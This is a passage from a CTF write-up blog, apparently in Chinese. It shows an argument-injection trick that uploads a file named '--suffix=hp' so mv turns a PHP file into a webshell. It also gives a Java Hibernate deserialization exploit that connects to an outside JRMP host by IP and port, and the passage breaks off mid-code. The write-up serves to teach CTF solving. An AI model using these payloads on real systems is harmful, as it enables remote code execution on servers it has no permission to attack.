        <span class="token selector">li</span> <span class="token punctuation">&#123;</span> <span class="token property">margin</span><span class="token punctuation">:</span> 5px 0<span class="token punctuation">;</span> <span class="token property">padding</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span> <span class="token property">background</span><span class="token punctuation">:</span> #f0f0f0<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>多文件上传服务<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>

    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert <span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'失败'</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'success'</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$message</span> <span class="token delimiter important">?></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>files<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>选择文件：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>files[]<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>files<span class="token punctuation">"</span></span> <span class="token attr-name">multiple</span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>上传到临时目录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>待确认上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$filesInTmp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>暂无待确认上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
            <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filesInTmp</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
            <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endforeach</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>confirm_move<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>确认上传完毕，移动到存储目录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>有源码都好说</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cd <span class="token interpolation"><span class="token variable">$uploadDir</span></span> ; mv * <span class="token interpolation"><span class="token variable">$targetDir</span></span> 2>&amp;1"</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">,</span> <span class="token variable">$returnCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>一眼顶真可以打参数注入 ，不过还是让我看了好一会</p>
<pre class="language-none"><code class="language-none">-S, --suffix&#x3D;SUFFIX override the usual backup suffix</code></pre>
<p>在mv里面我看到了这个参数，可以修改备份的后缀</p>
<p>所以可以先传一个1.p 文件，传到&#x2F;var&#x2F;www&#x2F;html&#x2F;upload<br>然后再传一个名为 <code>--suffix=hp</code>的文件，当作参数注入<br>之后再传一个<code>1.p</code>文件，移动的时候就会把前面那个1.p文件备份成 1.php文件</p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251203105009.png" alt="image.png" loading="lazy"></p>
<h3 id="flag？我就借走了"><a href="#flag？我就借走了" class="headerlink" title="flag？我就借走了"></a>flag？我就借走了</h3><p>软连接秒了</p>
<h3 id="Regretful-Deser"><a href="#Regretful-Deser" class="headerlink" title="Regretful_Deser"></a>Regretful_Deser</h3><p>黑名单</p>
<pre class="language-none"><code class="language-none">org.apache.commons.collections
javax.swing
com.sun.rowset
com.sun.org.apache.xalan
java.security
java.rmi.MarshalledObject
javax.management.remote.rmi.RMIConnector</code></pre>

<p>hibernate反序列化 12 都用不了，二次反序列也被ban了，不过hilbernate可以实现调用任意getter，那就找getter<br>网上搜索发现，作者写过但是把文章删了，不过还是泄露关键信息<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204114244.png" alt="image.png" loading="lazy"></p>
<p>其实他找的getter就是<code>sun.rmi.server.ActivatableRef#getRef</code><br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204113956.png" alt="image.png" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204114106.png" alt="image.png" loading="lazy"></p>
<p>可以打JRMP</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>isctf</span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>engine<span class="token punctuation">.</span>spi<span class="token punctuation">.</span></span><span class="token class-name">TypedValue</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>property<span class="token punctuation">.</span>access<span class="token punctuation">.</span>spi<span class="token punctuation">.</span></span><span class="token class-name">Getter</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>property<span class="token punctuation">.</span>access<span class="token punctuation">.</span>spi<span class="token punctuation">.</span></span><span class="token class-name">GetterMethodImpl</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>tuple<span class="token punctuation">.</span>component<span class="token punctuation">.</span></span><span class="token class-name">PojoComponentTuplizer</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>type<span class="token punctuation">.</span></span><span class="token class-name">ComponentType</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">ReflectionFactory</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ActivatableRef</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRef</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span></span><span class="token class-name">LiveRef</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">.</span></span><span class="token class-name">TCPEndpoint</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>activation<span class="token punctuation">.</span></span><span class="token class-name">ActivationID</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>activation<span class="token punctuation">.</span></span><span class="token class-name">Activator</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ObjID</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RemoteObjectInvocationHandler</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>  
  
<span class="token comment">/**  
 * @ClassName exp1  
 * @Description  
 * @Author Xutao  
 * @Date 2025年12月04日 11:20
 * @Version 1.0  
 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> exp1 <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>  
  
        <span class="token class-name">ObjID</span> id <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">TCPEndpoint</span> te <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCPEndpoint</span><span class="token punctuation">(</span><span class="token string">"117.72.157.7"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">UnicastRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> te<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">RemoteObjectInvocationHandler</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjectInvocationHandler</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">Object</span> proxy <span class="token operator">=</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>exp1<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Remote</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Activator</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token class-name">ActivationID</span> activationID <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActivationID</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Activator</span><span class="token punctuation">)</span> proxy<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> refClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.rmi.server.ActivatableRef"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">ReflectionFactory</span> rf <span class="token operator">=</span> <span class="token class-name">ReflectionFactory</span><span class="token punctuation">.</span><span class="token function">getReflectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> objCons <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> sc <span class="token operator">=</span> rf<span class="token punctuation">.</span><span class="token function">newConstructorForSerialization</span><span class="token punctuation">(</span>refClass<span class="token punctuation">,</span> objCons<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">ActivatableRef</span> activatableRef <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ActivatableRef</span><span class="token punctuation">)</span> sc<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>activatableRef<span class="token punctuation">,</span> <span class="token string">"id"</span><span class="token punctuation">,</span> activationID<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token class-name">Class</span> getterMethodImplClazz<span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.hibernate.property.access.spi.GetterMethodImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">GetterMethodImpl</span> getterMethodImpl<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">GetterMethodImpl</span><span class="token punctuation">)</span><span class="token function">getObject</span><span class="token punctuation">(</span>getterMethodImplClazz<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>getterMethodImpl<span class="token punctuation">,</span> <span class="token string">"getterMethod"</span><span class="token punctuation">,</span> refClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
  
        <span class="token class-name">Class</span> pojoComponentTuplizerClass<span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.hibernate.tuple.component.PojoComponentTuplizer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">PojoComponentTuplizer</span> pojoComponentTuplizer<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PojoComponentTuplizer</span><span class="token punctuation">)</span> <span class="token function">getObject</span><span class="token punctuation">(</span>pojoComponentTuplizerClass<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>pojoComponentTuplizer<span class="token punctuation">,</span> <span class="token string">"getters"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Getter</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> getterMethodImpl <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token class-name">Class</span> componentTypeClass<span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.hibernate.type.ComponentType"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">ComponentType</span> componentType<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ComponentType</span><span class="token punctuation">)</span> <span class="token function">getObject</span><span class="token punctuation">(</span>componentTypeClass<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token string">"propertySpan"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token string">"componentTuplizer"</span><span class="token punctuation">,</span> pojoComponentTuplizer<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token string">"propertyTypes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>type<span class="token punctuation">.</span></span>Type</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>type<span class="token punctuation">.</span></span>Type</span><span class="token punctuation">)</span> componentType<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token class-name">TypedValue</span> typedValue<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TypedValue</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
  
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        hashMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>typedValue<span class="token punctuation">,</span> <span class="token string">"fuck"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>typedValue<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">,</span>activatableRef<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token comment">//unserialize();  </span>
  
    <span class="token punctuation">&#125;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">Class</span> clazz<span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">while</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  
                <span class="token class-name">Field</span> field<span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>  
                field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
                field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  
                clazz <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
                clazz <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token punctuation">&#125;</span>  
        <span class="token punctuation">&#125;</span>  
    <span class="token punctuation">&#125;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token class-name">Class</span> clazz<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">ReflectionFactory</span> reflectionFactory<span class="token operator">=</span> <span class="token class-name">ReflectionFactory</span><span class="token punctuation">.</span><span class="token function">getReflectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">Constructor</span> constructor<span class="token operator">=</span> reflectionFactory<span class="token punctuation">.</span><span class="token function">newConstructorForSerialization</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>  
